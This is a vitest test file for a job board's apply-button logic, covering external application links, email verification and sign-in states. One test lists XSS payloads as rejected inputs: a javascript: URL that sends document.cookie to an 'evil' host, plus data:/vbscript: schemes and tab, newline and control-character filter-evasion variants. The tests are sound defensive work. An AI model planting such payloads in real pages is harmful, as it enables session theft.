import { describe, expect, it } from 'vitest';

import { resolveApplyAction } from './apply-derive';

/**
 * The apply ladder's load-bearing invariant (and the hosted
 * board's own rule): an external `applicationUrl`, when present, is the
 * apply path for EVERYONE, so a signed-in-but-unverified candidate is
 * never worse off than an anonymous visitor.
 */
describe('resolveApplyAction', () => {
  const url = 'https://employer.example/apply';

  it('external URL wins for an anonymous visitor', () => {
    expect(
      resolveApplyAction({
        jobSlug: 'senior-chef',
        applicationUrl: url,
        viewer: null,
        applied: false,
      }),
    ).toEqual({ kind: 'external', url });
  });

  it('external URL ALSO wins for a signed-in-but-unverified candidate (never worse than anonymous)', () => {
    // The exact regression the review caught: without this, an unverified
    // candidate is hard-blocked at the verify gate while an anonymous
    // visitor gets the external link for the identical job.
    expect(
      resolveApplyAction({
        jobSlug: 'senior-chef',
        applicationUrl: url,
        viewer: { emailVerified: false },
        applied: false,
      }),
    ).toEqual({ kind: 'external', url });
  });

  it('external URL wins for a VERIFIED candidate too (native never overrides an external link)', () => {
    // The regression this file exists to prevent: a verified candidate on
    // a job with both a jobSlug and an applicationUrl must still get the
    // external link, matching the hosted board's unconditional behavior.
    expect(
      resolveApplyAction({
        jobSlug: 'senior-chef',
        applicationUrl: url,
        viewer: { emailVerified: true },
        applied: false,
      }),
    ).toEqual({ kind: 'external', url });
  });

  it('a javascript:/data: applicationUrl is treated as absent (never a clickable href)', () => {
    for (const bad of [
      'javascript:fetch("https://evil/"+document.cookie)',
      '  javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
      // Filter-evasion: the browser's URL parser strips ASCII tab/LF/CR
      // before reading the scheme, so these all resolve to `javascript:`
      // at click time and must be rejected here too.
      'java\tscript:alert(1)',
      'java\nscript:alert(1)',
      'java\rscript:alert(1)',
      'jav\ta\nscript:alert(document.cookie)',
      // Leading C0 controls (NUL, US) and space are also removed by the
      // URL parser before the scheme is read, so these execute too.
      '\x00javascript:alert(document.cookie)',
      '\x1fjavascript:alert(1)',
      '   javascript:alert(1)',
      'javascript:alert(1)\x00',
    ]) {
      // With a native jobSlug, an unsafe URL must fall through to native.
      expect(
        resolveApplyAction({
          jobSlug: 'senior-chef',
          applicationUrl: bad,
          viewer: { emailVerified: true },
          applied: false,
        }),
      ).toEqual({ kind: 'native', jobSlug: 'senior-chef' });
      // With no native path, it must render nothing — not the bad href.
      expect(
        resolveApplyAction({
          jobSlug: null,
          applicationUrl: bad,
          viewer: null,
          applied: false,
        }),
      ).toEqual({ kind: 'none' });
    }
  });

  it('mailto: and https: application URLs are allowed', () => {
    expect(
      resolveApplyAction({
        jobSlug: null,
        applicationUrl: 'mailto:jobs@acme.example',
        viewer: null,
        applied: false,
      }),
    ).toEqual({ kind: 'external', url: 'mailto:jobs@acme.example' });
  });

  it('unverified with NO external URL → the verify gate', () => {
    expect(
      resolveApplyAction({
        jobSlug: 'senior-chef',
        applicationUrl: null,
        viewer: { emailVerified: false },
        applied: false,
      }),
    ).toEqual({ kind: 'verify-email' });
  });

  it('anonymous with no external URL → sign in', () => {
    expect(
      resolveApplyAction({
        jobSlug: 'senior-chef',
        applicationUrl: null,
        viewer: null,
        applied: false,
      }),
    ).toEqual({ kind: 'sign-in' });
  });

  it('external-only job (no jobSlug) → external for everyone', () => {
    expect(
      resolveApplyAction({
        jobSlug: null,
        applicationUrl: url,
        viewer: { emailVerified: true },
        applied: false,
      }),
    ).toEqual({ kind: 'external', url });
  });

  it('external-only job with no URL → nothing to render', () => {
    expect(
      resolveApplyAction({
        jobSlug: null,
        applicationUrl: null,
        viewer: null,
        applied: false,
      }),
    ).toEqual({ kind: 'none' });
  });

  it('verified candidate → native apply', () => {
    expect(
      resolveApplyAction({
        jobSlug: 'senior-chef',
        applicationUrl: null,
        viewer: { emailVerified: true },
        applied: false,
      }),
    ).toEqual({ kind: 'native', jobSlug: 'senior-chef' });
  });

  it('after a successful apply → the applications link', () => {
    expect(
      resolveApplyAction({
        jobSlug: 'senior-chef',
        applicationUrl: null,
        viewer: { emailVerified: true },
        applied: true,
      }),
    ).toEqual({ kind: 'applied' });
  });
});
